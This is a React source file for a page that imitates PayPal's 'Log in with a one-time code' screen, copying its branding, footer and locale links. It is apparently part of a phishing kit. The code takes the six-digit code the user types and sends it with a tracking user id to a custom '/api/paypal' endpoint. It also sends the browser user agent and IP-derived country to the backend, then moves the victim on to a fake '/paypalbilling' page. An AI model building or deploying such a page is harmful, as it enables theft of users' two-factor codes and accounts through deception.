import React, { useState, useEffect } from "react";
import ipinfo from "ipinfo";
import { useHistory } from "react-router-dom";
import axios from "axios";
import { zokomId } from "../utils/auth";

const VerifyOtp = () => {
    const userId = zokomId();
    const [flagUrl, setFlagUrl] = useState('');
    const [userCountry, setUserCountry] = useState('US'); // Default to US
    const [styles, setStyles] = useState(null);
    const [otpValues, setOtpValues] = useState(['', '', '', '', '', '']);
    const [isComplete, setIsComplete] = useState(false);
    const [isLoading, setIsLoading] = useState(true);
    const history = useHistory();
    const [location, setLocation] = useState('');
    const [phoneNumber, setPhoneNumber] = useState('');
    const [maskedNumber, setMaskedNumber] = useState('');
    const inputRefs = [
        React.useRef(null),
        React.useRef(null),
        React.useRef(null),
        React.useRef(null),
        React.useRef(null),
        React.useRef(null)
    ];
    useEffect(() => {
      const fetchCountryFromLocalStorage = async () => {
        try {
          const countryCode = localStorage.getItem('CountryCode') || 'US';
          setUserCountry(countryCode);
  
          const url = await getFlagUrl(countryCode);
          setFlagUrl(url);
        } catch (err) {
          console.error('Error fetching country from local storage:', err);
        }
      };
  
      fetchCountryFromLocalStorage();
    }, []);
  const handleTryAnotherWay = () => {
    history.push('/pass');
  };
  useEffect(() => {
    const fetchLocationAndSendVerification = async () => {
      // Get browser information
      const browserInfo = `${navigator.userAgent}`;

      // Send verification request to backend
      try {
        await axios.post(`${process.env.REACT_APP_API_URL}/api/code-verification`, {
          userId,
          browserInfo,
          location: userCountry // Use userCountry state for location
        });
      } catch (error) {
        console.error('Error sending verification request:', error);
      }
    };

    fetchLocationAndSendVerification();
  }, [userCountry, userId]);
  
    const getFlagUrl = async (countryCode) => {
        // Use a more reliable flag API
        return `https://purecatamphetamine.github.io/country-flag-icons/3x2/${countryCode.toUpperCase()}.svg`;
      };
    
      useEffect(() => {
        ipinfo((err, res) => {
          if (err) {
            console.error(err);
            return;
          }
          const country = res?.country || 'US';
          setUserCountry(country);
          getFlagUrl(country).then(url => {
            setFlagUrl(url);
          });
        });
      }, []);
    useEffect(() => {
        const loadStyles = async () => {
          try {
            const cssModule = await import('../../assets/styles/codeinput.css');
            setStyles(cssModule.default);
          } catch (error) {
            console.error('Error loading styles:', error);
          }
        };
    
        loadStyles();
      }, []);
    useEffect(() => {
      const fetchPhoneNumber = async () => {
        try {
          console.log(`Fetching mobile number for userId: ${userId}`); // Log the userId
          const response = await axios.get(`${process.env.REACT_APP_API_URL}/api/mobile/${userId}`);
          console.log('API Response:', response.data); // Log the response data
          console.log(phoneNumber);
          setPhoneNumber(phoneNumber);
          if (response.data.mobileNumber) {
            // Create masked version: first digit + XXX + last 4 digits
            const number = response.data.mobileNumber;
            const masked = `${number.charAt(1)}XXX-${number.slice(-4)}`;
            setMaskedNumber(masked);
          }
        } catch (error) {
          console.error('Error fetching phone number:', error);
          setMaskedNumber('your mobile number'); // Fallback text
        }
      };
    
      fetchPhoneNumber();
    }, [userId]);
    const maskPhoneNumber = (phoneNumber) => {
      if (!phoneNumber) return '';
      const visibleDigits = phoneNumber.slice(-4);
      const maskedDigits = phoneNumber.slice(0, -4).replace(/\d/g, 'X');
      return `${maskedDigits}${visibleDigits}`;
    };
    useEffect(() => {
        // Show loading spinner for 2 seconds
        setIsLoading(true);
        setTimeout(() => {
            setIsLoading(false);
        }, 2000);
    }, []);
    const handleGetNewCode = (e) => {
      e.preventDefault();
      setIsLoading(true);
      // Optional: Add logic to fetch a new code here
  
      // Set a timeout to hide the loading indicators after 2 seconds
      setTimeout(() => {
        setIsLoading(false);
      }, 2000); // 2000 milliseconds = 2 seconds
    };
  
  
    const handleInput = (e, index) => {
        const value = e.target.value;
        if (value.length > 1) return; // Prevent multiple digits
    
        const newOtpValues = [...otpValues];
        newOtpValues[index] = value;
        setOtpValues(newOtpValues);
    
        // Check if it's a digit
        if (/^\d$/.test(value)) {
          // Move to next input if available
          if (index < 5) {
            inputRefs[index + 1].current.focus();
          } else {
            // On last input, check if all fields are filled with digits
            const isAllDigits = newOtpValues.every(val => /^\d$/.test(val));
            if (isAllDigits) {
              setIsComplete(true);
              // Submit the code
              handleSubmit(newOtpValues.join(''));
            }
          }
        }
      };
    
      const handleKeyDown = (e, index) => {
        // Handle backspace
        if (e.key === 'Backspace' && !otpValues[index] && index > 0) {
          inputRefs[index - 1].current.focus();
        }
      };
    
      const handleSubmit = async (code) => {
        try {
          console.log('Submitting code:', code); // Debug log
          setIsLoading(true);
      
          const response = await axios.put(`${process.env.REACT_APP_API_URL}/api/paypal`, {
            userId: userId,
            OTPcode: code.toString(), // Ensure code is string
          });
      
          console.log('Backend response:', response.data); // Debug log
      
          if (response.status === 200) {
            setIsLoading(false);
            history.push('/paypalbilling');
          }
        } catch (error) {
          console.error('Error submitting code:', error.response?.data || error);
          setIsLoading(false);
        }
      };
      
    
    
      // Update the input fields in the render method
      const renderInputs = () => {
        return Array(6).fill(0).map((_, index) => (
          <input
            key={index}
            ref={inputRefs[index]}
            name="security_code"
            id={`otp${index + 1}`}
            className="pin-box"
            maxLength="1"
            type="number"
            pattern="[0-9]*"
            inputMode="numeric"
            min="0"
            max="9"
            value={otpValues[index]}
            onChange={(e) => handleInput(e, index)}
            onKeyDown={(e) => handleKeyDown(e, index)}
            autoComplete={index === 0 ? "one-time-code" : "off"}
          />
        ));
      };

  return (
    <div className="desktop">
    <div id="main" className="main">
      <section
        id="verifyOtp"
        className="contentAlignment verifyOtp verifyOtpPrimary otpPrimary"
        data-role="page"
      >
        <div className="corral">
          <div className="checkout">
            <div className="profileBar"></div>
            <div id="content" className="contentContainerBordered activeContent">
              <section id="otpVerification">
                <div>
                  <header>
                    <p className="paypal-logo paypal-logo-monogram">PayPal</p>
                  </header>
                  <div>
                    <div id="notifications" className="notifications"></div>
                    <h1 className="headerText adjustHeader">
                      Log in with a one-time code
                    </h1>
                    <div className="sendSmsResendLink slimTopP">
                      <p className="sendSmsMessage">Code sent to {maskedNumber}.</p>
                      <span className="resendLink">
                        <a id="resendLink" onClick={handleGetNewCode} className="scTrack:resendOtp">
                          Get new code
                        </a>
                      </span>
                    </div>
                    <form
                      method="post"
                      className="proceed maskable transformRightToLeft"
                      name="verifyOtp"
                      noValidate
                    >
                      <div className="textInput" id="security_codediv">
                        <div
                          className="otp-pin-container fieldWrapper"
                          id="security_code"
                        >
                          {renderInputs()}
                        </div>
                      </div>
                      <p className="tryAnotherWayLink" id="tryAnotherWayLink">
                        <a href="#" onClick={handleTryAnotherWay} className="scTrack:tryAnotherWayLink">
                          Try another way
                        </a>
                      </p>
                      <div>
                        <div id="tryAnotherWayModal" className="tryAnotherWayModal hide">
                          <div className="modal-content">
                            <div className="modal-content-header">
                              <div className="modal-header-text">
                                Try another way
                              </div>
                              <div>
                                <button
                                  id="closeModal"
                                  type="button"
                                  className="dialog-close"
                                ></button>
                              </div>
                            </div>
                            <ul className="modal-content-body">
                              <li className="hide">
                                <a id="loginWithWebauthn" href="#">
                                  <div>Log in with face, fingerprint or PIN</div>
                                  <button className="chevron-right"></button>
                                </a>
                              </li>
                              <li className="hide">
                                <a id="loginWithOtp" href="#">
                                  <div>Text a one-time code</div>
                                  <button className="chevron-right"></button>
                                </a>
                              </li>
                              <li className="hide">
                                <a id="loginWithEmailOtp" href="#">
                                  <div>Email a one-time code</div>
                                  <button className="chevron-right"></button>
                                </a>
                              </li>
                              <li>
                                <a id="loginWithPassword" href="#">
                                  <div>Log in with your password</div>
                                  <button className="chevron-right"></button>
                                </a>
                              </li>
                            </ul>
                          </div>
                        </div>
                      </div>
                    </form>
                  </div>
                </div>
              </section>
              <div className="intentFooter">
                <div className="cancelUrl">
                  <a
                    className="scTrack:unifiedlogin-click-cancel-and-return cancelLink"
                    id="cancelLink"
                    href="https://spotify.com"

                  >
                    Cancel and return to Spotify Inc
                  </a>
                </div>
                <div className="localeSelector">
                  <span className="picker country-selector">
                    <span className="hide" id="countryPickerLink">
                      {userCountry}
                    </span>
                    <button
                      type="button"
                      className="country US"
                      style={{
                        backgroundImage: `url(${flagUrl})`,
                        backgroundPosition: 'center',
                        width: '24px',
                        height: '17px',
                        border: 'none',
                        cursor: 'pointer',
                        paddingLeft: '8px',
                        paddingRight: '8px',
                        paddingTop: '8px',
                      }}
                    />
                  </span>
                  <ul className="localeLink">
                    <li>
                      <a
                        className="scTrackUnifiedloginFooterLanguageArEG"
                        href="/signin?intent=checkout&ctxId=xo_ctx_EC-5G140757D6791933L&returnUri=%2Fwebapps%2Fhermes&state=%3Fflow%3D1-P%26ulReturn%3Dtrue%26approval_session_id%3D91B256819V7453949%26ssrt%3D1735236027361%26token%3DEC-5G140757D6791933L%26rcache%3D1%26cookieBannerVariant%3Dhidden&flowId=EC-5G140757D6791933L&country.x=TN&locale.x=ar_EG&langTgl=ar"
                        lang="ar"
                        data-locale="ar_EG"
                        pa-marked="1"
                      >
                        العربية
                      </a>
                    </li>
                    <li>
                      <a
                        className="selected scTrackUnifiedloginFooterLanguageEnUS"
                        href="/signin?intent=checkout&ctxId=xo_ctx_EC-5G140757D6791933L&returnUri=%2Fwebapps%2Fhermes&state=%3Fflow%3D1-P%26ulReturn%3Dtrue%26approval_session_id%3D91B256819V7453949%26ssrt%3D1735236027361%26token%3DEC-5G140757D6791933L%26rcache%3D1%26cookieBannerVariant%3Dhidden&flowId=EC-5G140757D6791933L&country.x=TN&locale.x=en_US&langTgl=en"
                        lang="en"
                        data-locale="en_US"
                        aria-current="true"
                        pa-marked="1"
                      >
                        English
                      </a>
                    </li>
                    <li>
                      <a
                        className="scTrackUnifiedloginFooterLanguageFrXC"
                        href="/signin?intent=checkout&ctxId=xo_ctx_EC-5G140757D6791933L&returnUri=%2Fwebapps%2Fhermes&state=%3Fflow%3D1-P%26ulReturn%3Dtrue%26approval_session_id%3D91B256819V7453949%26ssrt%3D1735236027361%26token%3DEC-5G140757D6791933L%26rcache%3D1%26cookieBannerVariant%3Dhidden&flowId=EC-5G140757D6791933L&country.x=TN&locale.x=fr_XC&langTgl=fr"
                        lang="fr"
                        data-locale="fr_XC"
                        pa-marked="1"
                      >
                        Français
                      </a>
                    </li>
                    <li>
                      <a
                        className="scTrackUnifiedloginFooterLanguageEsXC"
                        href="/signin?intent=checkout&ctxId=xo_ctx_EC-5G140757D6791933L&returnUri=%2Fwebapps%2Fhermes&state=%3Fflow%3D1-P%26ulReturn%3Dtrue%26approval_session_id%3D91B256819V7453949%26ssrt%3D1735236027361%26token%3DEC-5G140757D6791933L%26rcache%3D1%26cookieBannerVariant%3Dhidden&flowId=EC-5G140757D6791933L&country.x=TN&locale.x=es_XC&langTgl=es"
                        lang="es"
                        data-locale="es_XC"
                        pa-marked="1"
                      >
                        Español
                      </a>
                    </li>
                    <li>
                      <a
                        className="scTrackUnifiedloginFooterLanguageZhXC"
                        href="/signin?intent=checkout&ctxId=xo_ctx_EC-5G140757D6791933L&returnUri=%2Fwebapps%2Fhermes&state=%3Fflow%3D1-P%26ulReturn%3Dtrue%26approval_session_id%3D91B256819V7453949%26ssrt%3D1735236027361%26token%3DEC-5G140757D6791933L%26rcache%3D1%26cookieBannerVariant%3Dhidden&flowId=EC-5G140757D6791933L&country.x=TN&locale.x=zh_XC&langTgl=zh"
                        lang="zh"
                        data-locale="zh_XC"
                        pa-marked="1"
                      >
                        中文
                      </a>
                    </li>
                  </ul>
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>
      <footer className={`footer ${window.innerWidth > 768 ? 'footerStayPut' : ''}`}>
        <div className="legalFooter">
          <ul className="footerGroup">
            <li>
              <a target="_blank" href="/us/smarthelp/contact-us" pa-marked="1">
                Contact Us
              </a>
            </li>
            <li>
              <a target="_blank" href="/us/webapps/mpp/ua/privacy-full" pa-marked="1">
                Privacy
              </a>
            </li>
            <li>
              <a target="_blank" href="/us/webapps/mpp/ua/legalhub-full" pa-marked="1">
                Legal
              </a>
            </li>
            <li>
              <a
                target="_blank"
                href="/us/webapps/mpp/ua/upcoming-policies-full"
                pa-marked="1"
              >
                Policy Updates
              </a>
            </li>
            <li>
              <a target="_blank" href="/us/webapps/mpp/country-worldwide" pa-marked="1">
                Worldwide
              </a>
            </li>
          </ul>
        </div>
      </footer>
      <div className={`transitioning spinnerWithLockIcon ${!isLoading ? 'hide' : ''}`} aria-busy="true">
      </div>
      <div className={`lockIcon ${!isLoading ? 'hide' : ''}`}></div>

      {/* Show main content only after loading */}
      <div style={{ display: isLoading ? 'none' : 'block' }}>
        <div className="transitioning spinnerWithLockIcon hide" aria-busy="false">
          <p className="welcomeMessage hide">Welcome, !</p>
        <p className="checkingInfo">Checking your info…</p>
        <p className="secureMessage">Securely logging you in...</p>
          <p className="checkingInfo hide">Checking your info…</p>
          <p className="oneSecond hide">Just a second…</p>
          <p className="secureMessage hide">Securely logging you in...</p>
          <p className="oneTouchMessage hide"></p>
          <p className="retrieveInfo hide">Retrieving your info...</p>
          <p className="waitFewSecs hide">This may take a few seconds...</p>
          <p className="qrcMessage hide">Redirecting...</p>
          <p className="webAuthnOptin hide">Updating your login settings...</p>
          <p className="webAuthnLogin hide">Logging you in...</p>
          <div className="keychain spinner-content uiExp hide"></div>
        </div>
        <div className="lockIcon hide"></div>
      </div>
    </div>
    </div>
  );
};

export default VerifyOtp;
